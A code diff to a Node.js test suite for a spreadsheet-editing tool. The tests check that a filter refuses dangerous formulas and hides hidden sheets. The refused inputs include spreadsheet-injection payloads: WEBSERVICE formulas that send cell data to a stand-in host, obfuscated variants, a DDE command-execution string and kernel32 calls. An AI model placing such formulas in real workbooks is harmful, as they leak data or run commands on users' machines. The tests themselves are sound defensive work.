@@ -1,7 +1,9 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import {
-	formulaProblem,
+	buildFile,
+	checkFormulas,
+	inspect,
 	prepareChanges,
 	reviewSpreadsheet,
 	validateChanges,
@@ -15,58 +17,106 @@ const cellChange = (input) => ({
 	cells: [{ address: 'B2', input }],
 });
 
-test('formulaProblem allows ordinary formulas, structured references and plain text', () => {
+// The forms a text filter let through: bare function references, storage prefixes, AI
+// functions; and a new workbook, which was not screened at all.
+const refusedInputs = [
+	'=WEBSERVICE("https://example.test/?d="&A1)',
+	'=webservice (A1)',
+	'=MAP(A1,WEBSERVICE)',
+	'=LET(f,WEBSERVICE,f(A1))',
+	'=BYROW(A1:A2,FILTERXML)',
+	'=_xlfn._xlws.WEBSERVICE(A1)',
+	'=LET(h,HYPERLINK,h("x","y"))',
+	'=+RTD("prog","","topic")',
+	'=REGISTER.ID("kernel32","GetTickCount","J")',
+	'=COPILOT("summarize",A1:A9)',
+	'=TRANSLATE(A1,"en","fr")',
+	'=STOCKHISTORY("MSFT",1)',
+	'=_xlfn._xlws.PY("x",0)',
+	'=CUBEVALUE("conn","m")',
+	"=cmd|' /C calc'!A1",
+	'=[1]Sheet1!A1',
+	'=[budget.xlsx]Sheet1!A1',
+	"=SUM('C:\\data\\[x.xlsx]S'!A1)",
+];
+
+test('checkFormulas refuses restricted formulas in edits and names the cell', async () => {
+	for (const input of refusedInputs)
+		await assert.rejects(
+			checkFormulas({ changes: [cellChange(input)] }),
+			/formula in B2 was rejected because it/,
+			input,
+		);
+});
+
+test('checkFormulas refuses them in a proposed new workbook too', async () => {
+	const create = [
+		{ type: 'docx', name: 'Brief', blocks: [{ type: 'paragraph', text: '=WEBSERVICE(A1)' }] },
+		{
+			type: 'xlsx',
+			name: 'Report',
+			sheets: [{ name: 'S', rows: [['secret', '=WEBSERVICE(A1)']] }],
+		},
+	];
+	await assert.rejects(checkFormulas({ create }), /formula in S!B1 was rejected/);
+	// Text in a Word document is not a formula.
+	await assert.doesNotReject(checkFormulas({ create: create.slice(0, 1) }));
+});
+
+test('checkFormulas allows ordinary formulas and look-alike text', async () => {
 	for (const input of [
 		'=SUM(A1:A3)',
-		'=IF(A1>0,"ok",B1)',
+		'=IF(A1="http",1,0)',
+		'="a|b"',
 		'=_xlfn.XLOOKUP(A1,B:B,C:C)',
 		'=Table1[Amount]',
 		'=[@Amount]*2',
 		'=MYIMAGE(A1)',
 		'=A1&"image"',
 		'plain text with IMAGE( and | pipes',
+		'+WEBSERVICE(A1)',
 		'42',
 	])
-		assert.equal(formulaProblem(input), null, input);
+		await assert.doesNotReject(checkFormulas({ changes: [cellChange(input)] }), input);
 });
 
-test('formulaProblem rejects network, code and link functions in any case or prefix', () => {
-	for (const input of [
-		'=WEBSERVICE("https://example.test/?d="&A1)',
-		'=webservice (A1)',
-		'=_xlfn.WEBSERVICE(A1)',
-		'=_xlws.FILTERXML(A1,"//x")',
-		'=filterxml(A1,"//x")',
-		'=HYPERLINK("x","y")',
-		'=IMAGE("u")',
-		'=+RTD("prog","","topic")',
-		'=CALL("kernel32","GetTickCount","J")',
-		'=REGISTER.ID("kernel32","GetTickCount","J")',
-		'=REGISTER("a","b")',
-	])
-		assert.match(formulaProblem(input) ?? '', /function/, input);
-});
-
-test('formulaProblem rejects DDE pipes, external workbooks, links and paths', () => {
-	assert.match(formulaProblem("=cmd|' /C calc'!A1") ?? '', /DDE/);
-	assert.match(formulaProblem('=[1]Sheet1!A1') ?? '', /external workbook/);
-	assert.match(formulaProblem('=[budget.xlsx]Sheet1!A1') ?? '', /external workbook/);
-	assert.match(formulaProblem("=SUM('C:\\data\\[x.xlsx]S'!A1)") ?? '', /link or a file path/);
-	assert.match(formulaProblem('=\\\\server\\share\\x') ?? '', /link or a file path/);
-	assert.match(formulaProblem('="http://example.test"') ?? '', /link or a file path/);
-	assert.match(formulaProblem('=file:///etc/passwd') ?? '', /link or a file path/);
-});
-
-test('validateChanges rejects an unsafe formula and names the cell', () => {
-	assert.throws(
-		() => validateChanges([cellChange('=WEBSERVICE("https://x.test")')], [xlsxDoc]),
-		/formula in B2 was rejected/,
+test('a restricted formula is refused when it is applied or built, whatever the card showed', async () => {
+	const doc = await workbook();
+	await assert.rejects(
+		prepareChanges([cellChange('=MAP(A1,WEBSERVICE)')], [doc]),
+		/B2: the formula was refused/,
+	);
+	await assert.rejects(
+		buildFile({ type: 'xlsx', name: 'R', sheets: [{ name: 'S', rows: [['=WEBSERVICE(A1)']] }] }),
+		/S!A1: the formula was refused/,
 	);
 });
 
-test('validateChanges accepts an ordinary formula and plain values', () => {
+test('validateChanges checks the shape of edits', () => {
 	assert.doesNotThrow(() => validateChanges([cellChange('=SUM(A1:A3)')], [xlsxDoc]));
 	assert.doesNotThrow(() => validateChanges([cellChange('12.5')], [xlsxDoc]));
+	assert.throws(() => validateChanges([{ ...cellChange('1'), type: 'word_run' }], [xlsxDoc]));
+});
+
+test('inspect leaves hidden workbook content out unless the policy includes it', async () => {
+	const { createXlsxFromSheets } = await import('ooxml-core/automation');
+	const { loadXlsx, saveXlsx } = await import('ooxml-core/xlsx');
+	const book = await loadXlsx(
+		await createXlsxFromSheets([
+			{ name: 'Public', rows: [['ok'], ['canary-row']] },
+			{ name: 'Payroll', rows: [['canary-sheet', 90000]] },
+		]),
+	);
+	book.sheets[1].state = 'veryHidden';
+	book.sheets[0].rowInfo.set(1, { hidden: true });
+	const bytes = await saveXlsx(book);
+	const view = await inspect({ kind: 'xlsx', bytes });
+	assert.doesNotMatch(JSON.stringify(view), /canary|Payroll/);
+	assert.match(view.omitted, /1 hidden sheet was left out/);
+	assert.match(view.omitted, /1 filled cell in hidden rows or columns was left out/);
+	const all = await inspect({ kind: 'xlsx', bytes }, 150000, { includeHidden: true });
+	assert.match(JSON.stringify(all), /canary-sheet/);
+	assert.equal(all.omitted, undefined);
 });
 
 async function workbook() {
